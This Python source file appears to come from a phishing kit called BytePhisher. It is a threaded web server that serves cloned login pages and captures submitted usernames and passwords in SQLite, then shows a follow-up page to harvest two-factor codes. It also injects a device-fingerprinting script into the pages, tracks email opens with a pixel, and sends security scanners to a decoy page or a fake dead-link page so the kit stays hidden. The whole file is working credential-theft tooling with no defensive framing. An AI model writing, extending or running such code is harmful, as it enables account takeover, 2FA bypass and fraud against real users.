# BytePhisher — pure-Python threaded HTTP server with TLS option,
# full request logging, SQLite-backed capture, and Jinja2 template rendering.
#
# No PHP dependency. Runs on any Python 3.10+.

import http.server
import socketserver
import ssl
import os
import json
import re
import secrets
import time
import urllib.parse
from urllib.parse import parse_qs, urlparse
from . import capture as cap
from . import intel as intel_mod
from .intel import INTEL_PATH, INTEL_JS_PATH
from . import templates as tpl
from . import risk as riskmod

# 1x1 transparent GIF (43 bytes) served at /px.gif for email open-tracking
GIF_1PX = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
           b"\x00\x02\x02D\x01\x00;")

def _extract_fields(raw: bytes, ct: str) -> dict:
    """Parse a form body into fields.

    Handles application/x-www-form-urlencoded, multipart/form-data (via the
    stdlib email parser — correct for quoted-printable and non-UTF8 charsets)
    and application/json (SPA-style templates post JSON instead of a form).
    """
    ct_l = (ct or "").lower()
    if "multipart/form-data" in ct_l:
        from email.parser import BytesParser
        from email.policy import default as default_policy
        header = f"Content-Type: {ct}\r\nMIME-Version: 1.0\r\n\r\n".encode()
        msg = BytesParser(policy=default_policy).parsebytes(header + raw)
        out = {}
        if msg.is_multipart():
            for part in msg.iter_parts():
                name = part.get_param("name", header="content-disposition")
                if not name or part.get_filename():
                    continue  # skip file uploads
                payload = part.get_payload(decode=True) or b""
                charset = part.get_content_charset() or "utf-8"
                out[name] = payload.decode(charset, "replace")
        return out
    if "application/json" in ct_l:
        try:
            data = json.loads(raw.decode("utf-8", "replace") or "{}")
            if isinstance(data, dict):
                return {k: (v if isinstance(v, str) else json.dumps(v)) for k, v in data.items()}
        except Exception:
            return {}
        return {}
    return {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "replace")).items()}

def _is_creds(d: dict) -> bool:
    """True when the submission looks like a credential pair.

    Two tiers: exact well-known field names first, then a substring heuristic so
    real-world variants (login_id, user_name, acct_email + passwd/passcode/…
    and imported custom templates) are still recognised.
    """
    keys = [k.lower() for k in d]
    id_exact = {"username", "email", "login", "user", "user_name", "email_address",
                "user_id", "username_or_email", "email_or_username", "userid", "login_id"}
    pw_exact = {"password", "passw", "pwd", "password_confirm", "passwd", "pass_code",
                "password_confirmation", "pass", "passphrase"}
    if (id_exact & set(keys)) and (pw_exact & set(keys)):
        return True
    ident = any(any(t in k for t in ("user", "login", "email", "mail", "account",
                                     "identifier", "phone", "mobile")) for k in keys)
    secret = any(any(t in k for t in ("pass", "pwd", "pin", "secret")) for k in keys)
    return ident and secret

def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
                 on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
                 gate=None, decoy_url="", intel=True, intel_perms=False):
    # A class body cannot see the enclosing function's locals for a name it is
    # itself assigning (`gate = gate` raises NameError), so bind through
    # differently-named locals.
    _gate_obj = gate
    _decoy_url = decoy_url
    _intel_on = bool(intel)
    _intel_perms = bool(intel_perms)
    _rotation = list(rotate_dirs or [])
    _notifier = on_capture

    class PhishHandler(http.server.BaseHTTPRequestHandler):
        # HTTP/1.1 so the victim's browser reuses the connection for the
        # collector waves and assets instead of opening a socket per request.
        # Every response in this handler sends Content-Length (required).
        protocol_version = "HTTP/1.1"
        db = cap.CaptureDB(db_path)
        redirect = redirect_url
        otp_page = otp
        # staticmethod: a plain function stored on the class would bind `self`
        # as its first argument and the callback would receive the handler
        # instead of the capture dict.
        notifier = staticmethod(_notifier) if _notifier else None
        template_name = site_name
        campaign_name = campaign or site_name or ""
        rotation = _rotation                   # A/B: one of these per request
        gate = _gate_obj                       # campaign gating (optional)
        decoy = _decoy_url
        intel_on = _intel_on                   # deep device dump on page open
        intel_perms = _intel_perms             # permission-gated probes
        geo_cache = {}                         # ip -> (ts, geo), for gating lookups
        geo_cache_ttl = 600

        def log_message(self, fmt, *args):
            pass  # silence default stderr logging; structured logs go to DB

        def _client_ip(self):
            """Real client IP: tunnel/edge headers win over the socket address,
            otherwise every hit behind cloudflared/ngrok looks like 127.0.0.1."""
            for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                v = self.headers.get(h)
                if v:
                    return v.strip()
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
            return self.client_address[0]

        GEO_URLS = {
            # free, no-key endpoints; correct paths matter (a bare host 404s)
            "ipapi":  "https://ipapi.co/{ip}/json/",
            "ipinfo": "https://ipinfo.io/{ip}/json",
        }

        def _json(self, obj, status=200):
            body = json.dumps(obj, default=str).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _store_intel(self, payload):
            """Merge one device-dump wave into the session's intel record."""
            sid = str(payload.get("sid") or "").strip() or self._intel_sid()
            ip = self._client_ip()
            try:
                merged = intel_mod.merge_waves(self.db.intel_for_session(sid), payload)
            except Exception:
                merged = intel_mod.merge_waves({}, payload)
            geo = self._geo_cached(ip) if self.gate and self.gate.needs_geo else self._geo(ip)
            summary = intel_mod.summarize(merged, ua=payload.get("ua")
                                          or self.headers.get("User-Agent", ""),
                                          server_ip=ip,
                                          geo_country=(geo or {}).get("country", ""))
            summary["sid"] = sid
            risk = intel_mod.risk_from_intel(summary)
            raw = {"mods": merged, "last": payload}
            try:
                if self.db.intel_for_session(sid):
                    self.db.intel_update(sid, summary, raw, risk=risk)
                else:
                    self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
                                      (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
                                      payload.get("ua") or self.headers.get("User-Agent", ""),
                                      summary, raw, risk=risk)
            except Exception as e:
                return {"ok": False, "error": f"store failed: {e}"}
            if self.notifier and payload.get("wave") in ("open", "gesture", "final"):
                try:
                    self.notifier({"type": "intel", "sid": sid, "ip": ip,
                                   "browser": summary.get("browser"), "os": summary.get("os"),
                                   "device_class": summary.get("device_class"),
                                   "device_token": (summary.get("fingerprint") or {}).get("device_token"),
                                   "headless": (summary.get("automation") or {}).get("headless_score"),
                                   "vpn": (summary.get("network_risk") or {}).get("vpn_suspected_score"),
                                   "wave": payload.get("wave")})
                except Exception:
                    pass
            return {"ok": True, "sid": sid, "wave": payload.get("wave"),
                    "modules": len(summary.get("modules_collected") or []),
                    "headless": (summary.get("automation") or {}).get("headless_score"),
                    "device_token": (summary.get("fingerprint") or {}).get("device_token")}

        def _geo_cached(self, ip):
            """Geo with a per-process TTL cache — gating must not call the geo
            API on every single request."""
            now = time.time()
            hit = self.geo_cache.get(ip)
            if hit and now - hit[0] < self.geo_cache_ttl:
                return hit[1]
            geo = self._geo(ip)
            self.geo_cache[ip] = (now, geo)
            return geo

        def _gated_out(self, ip, geo=None):
            """True when the campaign gate refuses this visitor.
            The refusal is logged (with reason) and the visitor gets the decoy."""
            if not (self.gate and self.gate.enabled):
                return False
            geo = geo or (self._geo_cached(ip) if self.gate.needs_geo
                          else {"country": "", "isp": ""})
            allowed, reason = self.gate.check(ip=ip, country=geo.get("country"),
                                             isp=geo.get("isp"))
            if allowed:
                return False
            try:
                self.db.log_blocked(ip, geo.get("country", ""), reason)
            except Exception:
                pass
            if self.decoy:
                self.send_response(302)
                self.send_header("Location", self.decoy)
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                # inert page: looks like a dead link, not a phishing framework
                body = (b"<!doctype html><html><head><title>503</title></head>"
                        b"<body><h1>Service unavailable</h1>"
                        b"<p>This link is no longer active.</p></body></html>")
                self.send_response(503)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            return True

        def _geo(self, ip):
            if geo_provider == "off" or not ip:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            tmpl = self.GEO_URLS.get(geo_provider)
            if not tmpl:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            try:
                from . import net
                g = net.fetch_json(tmpl.format(ip=ip), timeout=5)
                return {
                    "ip": ip,
                    "city": g.get("city") or "",
                    "country": (g.get("country_name") or g.get("country") or ""),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or ""),
                }
            except Exception:
                return {"ip": ip, "city": "", "country": "", "isp": ""}

        def _device(self, ua: str):
            ua_l = ua.lower()
            if "iphone" in ua_l or "ipad" in ua_l:
                return "ios"
            if "android" in ua_l:
                return "android"
            if "mac" in ua_l:
                return "macos"
            if "win" in ua_l:
                return "windows"
            if "linux" in ua_l:
                return "linux"
            return "unknown"

        def _intel_sid(self):
            """Session id for the device dump: reuse the __bhi cookie, else mint one."""
            m = re.search(r"__bhi=([0-9a-f]{8,64})", self.headers.get("Cookie") or "")
            if m:
                return m.group(1)
            return secrets.token_hex(16)

        def do_GET(self):
            if self.path.split("?")[0] in (INTEL_JS_PATH, "/intel.js"):
                q = parse_qs(urlparse(self.path).query)
                sid = (q.get("s", [self._intel_sid()])[0] or self._intel_sid())
                perms = q.get("p", ["1" if self.intel_perms else "0"])[0] in ("1", "true")
                import os as _os
                js_path = _os.path.join(_os.path.dirname(_os.path.dirname(
                    _os.path.abspath(__file__))), "assets", "intel.js")
                try:
                    js = intel_mod.render_js(js_path, sid, perms=perms).encode()
                except Exception as e:
                    js = ("/* intel collector unavailable: %s */" % e).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(js)))
                self.send_header("Set-Cookie", f"__bhi={sid}; Path=/; SameSite=Lax")
                self.end_headers()
                self.wfile.write(js)
                return
            if self.path == "/health":
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            # 1x1 email open-tracking pixel: returns a real GIF and counts a visit
            if self.path.startswith("/px.gif"):
                try:
                    self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
                except Exception:
                    pass
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Content-Length", str(len(GIF_1PX)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(GIF_1PX)
                return
            # page view -> visitor counter (creds come in via POST).
            # The campaign gate runs first: a refused visitor is logged as
            # blocked and never counted as a served visitor.
            ip = self._client_ip()
            if self._gated_out(ip):
                return
            try:
                self.db.log_visit(ip, self.headers.get("User-Agent", ""))
            except Exception:
                pass
            if self.gate and self.gate.enabled:
                self.gate.note_hit(ip)
            # render template — OTP page only when explicitly requested (/otp),
            # otherwise the victim always sees the login page first.
            # With --rotate, one of the rotation templates is chosen per request.
            import random
            site = (random.choice(self.rotation) if self.rotation
                    else self.server.current_site)
            self.served_site = site
            if site and os.path.isdir(site):
                want_otp = self.otp_page and "otp" in self.path.lower()
                html = tpl.render_site(site, self.path, want_otp)
                if self.intel_on:
                    sid = self._intel_sid()
                    tag = (f'<script src="{INTEL_JS_PATH}?s={sid}&p='
                           f'{1 if self.intel_perms else 0}" data-intel="{INTEL_PATH}" defer></script>')
                    if "</head>" in html.lower():
                        html = re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
                    else:
                        html = tag + html
                    self._intel_cookie = sid
                self.send_response(200)
                body = html.encode("utf-8")
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                if getattr(self, "_intel_cookie", None):
                    self.send_header("Set-Cookie",
                                     f"__bhi={self._intel_cookie}; Path=/; SameSite=Lax")
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_error(404)

        def do_POST(self):
            if self.path.split("?")[0] in (INTEL_PATH, "/intel"):
                n = int(self.headers.get("Content-Length", 0))
                if n > 2 * 1024 * 1024:
                    self.send_response(413)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                raw = self.rfile.read(n) if n else b""
                try:
                    payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                    if not isinstance(payload, dict):
                        raise ValueError("not an object")
                except Exception:
                    self._json({"ok": False, "error": "malformed json"}, status=400)
                    return
                if not payload.get("mods") and not payload.get("errors"):
                    self._json({"ok": False, "error": "empty payload"}, status=400)
                    return
                self._json(self._store_intel(payload))
                return
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)
            ct = (self.headers.get("Content-Type") or "").lower()
            fields = _extract_fields(raw, ct)
            ip = self._client_ip()
            if self._gated_out(ip):
                return
            geo = self._geo(ip)
            ua = self.headers.get("User-Agent", "")
            dev = self._device(ua)
            creds = _is_creds(fields)
            has_otp = any(k.lower().startswith("otp") for k in fields)
            # label bots/scanners instead of losing them: keeps reporting honest
            risk, risk_reasons = riskmod.score(fields, ua=ua, isp=geo["isp"], device=dev,
                                               country=geo["country"], city=geo["city"])
            self.db.record(
                source_url=self.headers.get("Referer", self.path),
                ip=geo["ip"], city=geo["city"], country=geo["country"],
                isp=geo["isp"], ua=ua, device=dev,
                fields=fields, is_cred=creds, campaign=self.campaign_name,
                risk=risk, risk_reasons=risk_reasons,
            )
            if self.notifier:
                try:
                    self.notifier({
                        "ts": time.time(), "template": self.template_name,
                        "campaign": self.campaign_name,
                        "ip": geo["ip"], "city": geo["city"], "country": geo["country"],
                        "isp": geo["isp"], "device": dev, "ua": ua,
                        "fields": fields, "is_cred": creds,
                        "risk": risk, "risk_reasons": risk_reasons,
                        "source_url": self.headers.get("Referer", self.path),
                    })
                except Exception:
                    pass  # an alert failure must never break the capture path
            # 2FA flow: after the first credential submit, show the OTP page.
            if self.otp_page and creds and not has_otp:
                served = getattr(self, "served_site", None) or self.server.current_site
                body = tpl.render_site(served, "/", True).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif self.redirect:
                self.send_response(302)
                self.send_header("Location", self.redirect)
                # HTTP/1.1 needs an explicit body length (0) or the client
                # waits for a body that never comes and keep-alive desyncs
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                body = tpl.render_thankyou().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

    return PhishHandler

def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel=True,
          intel_perms=False,
            redirect_url="", otp=False, tls=False, cert_path=None,
            on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
            gate=None, decoy_url=""):
    """Start the server; returns (httpd, handler_class)."""
    Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                           on_capture=on_capture, site_name=site_name, campaign=campaign,
                           rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url,
                           intel=intel, intel_perms=intel_perms)
    class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        # HTTPServer's default backlog is 5; a burst of simultaneous victims
        # (or scanners) would get RST. 128 handles real campaign traffic.
        request_queue_size = 128
        allow_reuse_address = True
    httpd = _ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if tls and cert_path:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # key path: "cert_cert.pem" -> "cert_key.pem"; anything else gets ".key"
        if "_cert." in cert_path:
            key_path = cert_path.replace("_cert.", "_key.")
        elif "cert." in os.path.basename(cert_path) and "cert_cert" not in cert_path:
            key_path = cert_path.replace("cert.", "key.")
        else:
            key_path = cert_path + ".key"
        ctx.load_cert_chain(cert_path, key_path)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.current_site = site_folder
    return httpd, Handler
